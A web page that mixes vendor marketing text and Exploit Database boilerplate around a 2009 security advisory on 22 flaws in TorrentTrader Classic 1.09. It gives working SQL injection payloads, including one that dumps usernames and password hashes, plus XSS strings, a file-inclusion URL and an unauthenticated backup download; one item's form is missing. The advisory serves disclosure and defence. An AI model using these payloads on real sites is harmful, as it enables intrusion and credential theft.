How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

[waraxe-2009-SA#074] - Multiple Vulnerabilities in TorrentTrader Classic 1.09
===============================================================================

Author: Janek Vind "waraxe"
Date: 15. June 2009
Location: Estonia, Tartu
Web: http://www.waraxe.us/advisory-74.html

Description of vulnerable software:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

TorrentTrader is a feature packed and highly customisable PHP/MySQL Based
BitTorrent tracker. Featuring integrated forums and plenty of administration
options. Please visit www.torrenttrader.org for the support forums.

http://sourceforge.net/projects/torrenttrader

List of found vulnerabilities
===============================================================================

1. Sql Injection vulnerability in "account-inbox.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "origmsg" is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

Test:

http://localhost/torrenttrader109/account-inbox.php?msg=1&receiver=waraxe&origmsg=foobar&delete=yes

Result: "MYSQL Error has occurred!"

-----------------------------[source code start]-------------------------------
if ($msg) {
  $msg = trim($msg);

  $res = mysql_query("SELECT id, acceptpms, notifs, email, UNIX_TIMESTAMP(last_access) as la FROM users WHERE username=".sqlesc($receiver)."");
  $user = mysql_fetch_assoc($res);
  if (!$user)
    $message = "Username not found.";
...

    if ($origmsg && $delete == "yes")
       mysql_query("DELETE FROM messages WHERE id=$origmsg") or sqlerr();
-----------------------------[source code end]---------------------------------

2. Weak password generation algorithm in "account-recover.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. generated password is weak and can be easily bruteforced
Preconditions:
  1. attacker must know email address associated with target's account

Torrenttrader contains password reseting functionality:

http://localhost/torrenttrader109/account-recover.php

Anyone can initiate password reset, only condition is, that target's email
address must be know. Torrenttrader will check email address and after successful
validation new, temporal password will be generated and sent to that email address.
Specific autogenerated password appears to be random number between 10000 and 50000,
so basically there can be only 40000 possible temporal passwords. It's easy to
write bruteforce script, which will try all possible password combinations.
This process can take couple of hours or more, but eventually the password will
be guessed and target account becomes compromised.

-----------------------------[source code start]-------------------------------
if ($HTTP_SERVER_VARS["REQUEST_METHOD"] == "POST") {
  $email = trim($_POST["email"]);
  if (!validemail($email)) {
	$msg = "" . NOT_VAILD_EMAIL . "";
	$kind = "Error";
  }
  else {
	  $res = mysql_query("SELECT * FROM users WHERE email=" . sqlesc($email) . " LIMIT 1");
	  $arr = mysql_fetch_assoc($res);

	  if (!$arr) {
	    $msg = "" . EMAIL_INVALID . "";
	    $kind = "Error";
	  }
...
	  if ($arr) {
	  	$newpassword = rand(10000, 50000);
	  	$md5pass = md5($newpassword);
-----------------------------[source code end]---------------------------------

3. Unauthorized database backup vulnerability in "backup-database.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. mysqldump utility must be available
  2. gzip utility must be available
  3. target directory must be writable
  4. database name must be known in order to successfully guess archive filename

Test:

http://localhost/torrenttrader109/backup-database.php

Resulting message: "Database backup successful, entry inserted into database."

-----------------------------[source code start]-------------------------------
system(sprintf(
  'mysqldump --opt -h %s -u %s -p%s %s | gzip > %s/%s/%s-%s-%s-%s.gz',
  $host,
  $user,
  $pass,
  $db,
  getenv('DOCUMENT_ROOT'),
  $backupdir,
  $db,
  $day,
  $month,
  $year
 ));
-----------------------------[source code end]---------------------------------

Attacker is able to create database backup and resulting "gz" archive's
filename can be guessed, if attacker knows database name. This file is also
directly downloadable from website. Example download URI:

http://localhost/torrenttrader109/backups/torrenttrader109-10-06-2009.gz

As result information leakage exists. For example, attacker can fetch admin
credentials from backed up database.

4. Sql Injection vulnerability in "browse.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable "wherecatin" is used in sql query
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/browse.php?wherecatin=waraxe

Result:

Unknown column 'waraxe' in 'where clause'

-----------------------------[source code start]-------------------------------
if (count($wherecatina) > 1)
$wherecatin = implode(",",$wherecatina);
elseif (count($wherecatina) == 1)
$wherea[] = "category = $wherecatina[0]";
...
if ($wherecatin)
$where .= ($where ? " AND " : "") . "category IN(" . $wherecatin . ")";

if ($where != "")
$where = "WHERE $where";

$res = mysql_query("SELECT COUNT(*) FROM torrents $where") or die(mysql_error());
-----------------------------[source code end]---------------------------------

This specific sql injection vulneraility can be exploited using blind attack
methods. If there is one or more active torrents in database, then usable is
attack pattern below:

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)>1,1,2)=(SELECT+1

and we see found torrents.

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)>50,1,2)=(SELECT+1

"No torrents were found based on your search criteria."

In this way attacker is able to ask boolean questions from database and retrieve
needed information bit by bit - example of classical blind sql injection.

If there is no active torrents in database, then induced sql errors method can be used.

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)>1,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1

"Subquery returns more than 1 row"

http://localhost/torrenttrader109/browse.php?wherecatin=0)+OR+IF(LENGTH(@@version)>50,(SELECT 1 UNION ALL SELECT 1),2)=(SELECT+1

"No torrents were found based on your search criteria."

5. Information leakage in "check.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/check.php

This script is originally meant to be used by installer and lately by admins.
Because of lacking access control attacker is able to use it for gathering some
useful information about target system - full path to webroot, file and directory
permissions of specific files, couple of php settings.

6. Sql Injection vulnerability in "delreq.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "categ" is used in sql query
Preconditions:
  1. attacker must have at least super moderator privileges (user class > 3)
Comments:
  1. very easy to exploit

Test:

http://localhost/torrenttrader109/delreq.php?categ=waraxe

Result:

You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near
'waraxe order by requests.request LIMIT 0,50' at line 1

Test 2:

http://localhost/torrenttrader109/delreq.php?categ=UNION+ALL+SELECT+1,2,3,4,5,username,password,email+FROM+users--+

and we can see all usernames, password hashes and emails from database.

7. Sql Injection vulnerability in "index.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "choice" is used in sql query
Preconditions:
  1. attacker must be logged in as valid user
  2. there must exist at least one poll

Testing needs custom written html form:
-------------------------------------------------------------------------------
<html><body><center>
<form action="http://localhost/torrenttrader109/index.php" method="post">
<input type="hidden" name="choice" value="waraxe">
<input type="submit" value="Test!">
</form></center></body></html>
-------------------------------------------------------------------------------

Result: "MYSQL Error has occurred!"

-----------------------------[source code start]-------------------------------
if ($_SERVER["REQUEST_METHOD"] == "POST")
{
  $choice = $_POST["choice"];
  if ($CURUSER && $choice != "" && $choice < 256 && $choice == floor($choice))
  {
    $res = mysql_query("SELECT * FROM polls ORDER BY added DESC LIMIT 1") or sqlerr();
    $arr = mysql_fetch_assoc($res) or die("No poll");
    $pollid = $arr["id"];
    $userid = $CURUSER["id"];
    $res = mysql_query("SELECT * FROM pollanswers WHERE pollid=$pollid && userid=$userid") or sqlerr();
    $arr = mysql_fetch_assoc($res);
    if ($arr) die("Dupe vote");
    mysql_query("INSERT INTO pollanswers VALUES(0, $pollid, $userid, $choice)") or sqlerr();
-----------------------------[source code end]---------------------------------

8. Sql Injection vulnerability in "modrules.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "id" is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

Testing needs custom written html form:

-----------------------------[source code end]---------------------------------

9. Information leakage in "phpinfo.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. missing access control
Preconditions:
  1. none

Test:

http://localhost/torrenttrader109/phpinfo.php

-----------------------------[source code start]-------------------------------
<?php
phpinfo();
?>
-----------------------------[source code end]---------------------------------

This script can be used by attacker to obtain information from php function
phpinfo(). Access to such script must be limited to admins, but currently there
is not any access control at all.

10. Sql Injection vulnerabilities in "report.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "user" is used in sql query
  2. unsanitized user submitted parameter "torrent" is used in sql query
  3. unsanitized user submitted parameter "forumid" is used in sql query
  4. unsanitized user submitted parameter "forumpost" is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

Two proof-of-concept tests below are using parameter "user".

Test 1 needs custom written html form:
-------------------------------------------------------------------------------
<html><body><center>
<form action="http://localhost/torrenttrader109/report.php" method="post">
<input type="hidden" name="reason" value="test">
<input type="hidden" name="user" value="0 UNION SELECT IF(LENGTH(@@version)>1,(SELECT 1 UNION ALL SELECT 1),1)-- ">
<input type="submit" value="Test!">
</form></center></body></html>
-------------------------------------------------------------------------------

Test result: "MYSQL Error has occurred!"

Test 2 needs custom written html form:
-----------------------------[source code start]-------------------------------
<html><body><center>
<form action="http://localhost/torrenttrader109/report.php" method="post">
<input type="hidden" name="reason" value="test">
<input type="hidden" name="user" value="0 UNION SELECT IF(LENGTH(@@version)>50,(SELECT 1 UNION ALL SELECT 1),1)-- ">
<input type="submit" value="Test!">
</form></center></body></html>
-----------------------------[source code end]---------------------------------

Test result: "You have already reported user ..."

It's classical blind sql injection exploitation method and allows attacker to
fetch information from database bit by bit by asking boolean questions.

Other three sql injection vulnerabilities in "report.php" involve user submitted
parameters "torrent", "forumid" and "forumpost" and exploitation can be done in
similar way as seen above.

11. Sql Injection vulnerability in "take-deletepm.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "delmp" is used in sql query
Preconditions:
  1. attacker must have admin privileges

-----------------------------[source code start]-------------------------------
if(isset($_POST["delmp"])) {
	$do="DELETE FROM messages WHERE id IN (" . implode(", ", $_POST[delmp]) . ")";
	$res=mysql_query($do)
-----------------------------[source code end]---------------------------------

12. Sql Injection vulnerability in "takedelreport.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "delreport" is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();

$res = mysql_query ("SELECT id FROM reports WHERE dealtwith=0
  AND id IN (" . implode(", ", $_POST[delreport]) . ")");
-----------------------------[source code end]---------------------------------

13. Sql Injection vulnerability in "takedelreq.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "delreq" is used in sql query
Preconditions:
  1. attacker must be logged in as valid user

-----------------------------[source code start]-------------------------------
if (get_user_class() > UC_JMODERATOR){
...
$do="DELETE FROM requests WHERE id IN (" . implode(", ", $_POST[delreq]) . ")";
$do2="DELETE FROM addedrequests WHERE requestid IN (" . implode(", ", $_POST[delreq]) . ")";
$res2=mysql_query($do2);
$res=mysql_query($do);
...
} else {
foreach ($_POST[delreq] as $del_req){
$delete_ok = checkRequestOwnership($CURUSER[id],$del_req);
if ($delete_ok){
$do="DELETE FROM requests WHERE id IN ($del_req)";
$do2="DELETE FROM addedrequests WHERE requestid IN ($del_req)";
...
function checkRequestOwnership ($user, $delete_req){
$query = mysql_query("SELECT * FROM requests WHERE userid=$user AND id = $delete_req") or sqlerr();
-----------------------------[source code end]---------------------------------

14. Sql Injection vulnerability in "takestaffmess.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "clases" is used in sql query
Preconditions:
  1. attacker must have admin privileges

-----------------------------[source code start]-------------------------------
adminonly();
...
$updateset = $_POST['clases'];

$query = mysql_query("SELECT id FROM users WHERE class IN (".implode(",", $updateset).")");
-----------------------------[source code end]---------------------------------

15. Sql Injection vulnerability in "takewarndisable.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameter "warndisable" is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();
...
if ($disable != '') {
$do="UPDATE users SET enabled='no' WHERE id IN (" . implode(", ", $_POST['warndisable']) . ")";
$res=mysql_query($do);
}

if ($enable != '') {
$do = "UPDATE users SET enabled='yes' WHERE id IN (" . implode(", ", $_POST['warndisable']) . ")";
$res = mysql_query($do);
}
-----------------------------[source code end]---------------------------------

16. Sql Injection vulnerability in "today.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable "limit" is used in sql query
Preconditions:
  1. none
Comments:
  1. seems hard to exploit

Test:

http://localhost/torrenttrader109/today.php?limit=waraxe

Result:

"Warning: mysql_num_rows(): supplied argument is not a valid MySQL result
resource in C:\apache_wwwroot\torrenttrader109\today.php on line 21"

17. Sql Injection vulnerability in "torrents-details.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable "where" is used in sql query
Preconditions:
  1. none

-----------------------------[source code start]-------------------------------
//speed mod
$resSpeed = mysql_query("SELECT seeders,leechers FROM torrents
WHERE $where visible='yes' and id = $id ORDER BY added DESC LIMIT 15")
or sqlerr(__FILE__, __LINE__);
-----------------------------[source code end]---------------------------------

Exploitation is possible using blind sql injection methods.

Test 1:

http://localhost/torrenttrader109/torrents-details.php?id=1&
where=1=IF(LENGTH(@@version)>1,1,(SELECT+1+UNION+ALL+SELECT+1))--+

Result: normal page

Test 2:

http://localhost/torrenttrader109/torrents-details.php?id=1&
where=1=IF(LENGTH(@@version)>50,1,(SELECT+1+UNION+ALL+SELECT+1))--+

Result: "MYSQL Error has occurred!"

18. Sql Injection vulnerability in "admin-delreq.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. uninitialized variable "categ" is used in sql query
Preconditions:
  1. attacker must have at least moderator privileges

-----------------------------[source code start]-------------------------------
jmodonly();
...
$res=mysql_query("SELECT users.username, requests.filled, requests.filledby,
requests.id, requests.userid, requests.request, requests.added, categories.name
as cat FROM requests inner join categories on requests.cat = categories.id
inner join users on requests.userid = users.id
$categ  order by requests.request $limit") or print(mysql_error());
-----------------------------[source code end]---------------------------------

Test:

http://localhost/torrenttrader109/admin-delreq.php?categ=waraxe

Result: "You have an error in your SQL syntax; check the manual that corresponds
to your MySQL server version for the right syntax to use
near 'waraxe order by requests.request LIMIT 0,50' at line 1"

19. Persistent XSS in "viewrequests.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameters used in response html generation
Preconditions:
  1. attacker must be logged in as valid user

Steps for testing:

a) attacker submits request:

http://localhost/torrenttrader109/requests.php

In "Title" field let's insert some javascript:

testtitle<script>alert(123);</script>

b) admin will browse requests:

http://localhost/torrenttrader109/viewrequests.php

and previously planted javascript will be executed in admin session context.

20. Persistent XSS in logging funtionality
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. unsanitized user submitted parameters used in response html generation
Preconditions:
  1. attacker must be logged in as valid user

Steps for testing:

a) attacker uploads torrent file:

http://localhost/torrenttrader109/torrents-upload.php

In "Torrent Name" field let's insert some javascript:

testname<script>alert(123);</script>

Upload is successful: "The torrent has been uploaded successfully!"

b) admin will browse logs:

http://localhost/torrenttrader109/admin.php?act=view_log

and previously planted javascript will be executed in admin session context.

21. Local File Inclusion vulnerability in "backend/admin-functions.php"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Reasons:
  1. URI case-insensitivity on Windows platform
Preconditions:
  1. Windows platform
  2. register_globals=on
  3. magic_quotes_gpc=off

-----------------------------[source code start]-------------------------------
if (strpos($_SERVER['REQUEST_URI'], "admin-functions.php") !== false) die;
require_once("./themes/" . $GLOBALS['ss_uri'] . "/block.php");
-----------------------------[source code end]---------------------------------

As we can see from source code snippet above, direct access to script is blocked.
In case of Windows and Apache combination URI handling is case-insensitive.
In other hand "strpos()" function, used for access control, is case-sensitive.
So this script can be directly executed, if we change some characters in script's
filename to uppercase:

http://localhost/torrenttrader109/backend/Admin-functions.php

"Warning: require_once(./themes//block.php) [function.require-once]:
failed to open stream: No such file or directory in
C:\apache_wwwroot\torrenttrader109\backend\admin-functions.php on line 3"

If "register_globals=on" and "magic_quotes_gpc=off", then LFI is possible:

http://localhost/torrenttrader109/backend/Admin-functions.php?ss_uri=../../banners.txt%00

22. Reflected XSS in multiple scripts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Examples:

http://localhost/torrenttrader109/themes/default/footer.php?ttversion=<script>alert(123);</script>
http://localhost/torrenttrader109/themes/default/header.php?SITENAME="><script>alert(123);</script>
http://localhost/torrenttrader109/themes/default/header.php?CURUSER[username]=<script>alert(123);</script>
http://localhost/torrenttrader109/visitorstoday.php?todayactive=<script>alert(123);</script>
http://localhost/torrenttrader109/visitorsnow.php?activepeople=<script>alert(123);</script>
http://localhost/torrenttrader109/faq.php?faq_categ[999][title]=<script>alert(123);</script>&faq_categ[999][flag]=1
http://localhost/torrenttrader109/torrents-details.php?id=1&keepget="><script>alert(123);</script>

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
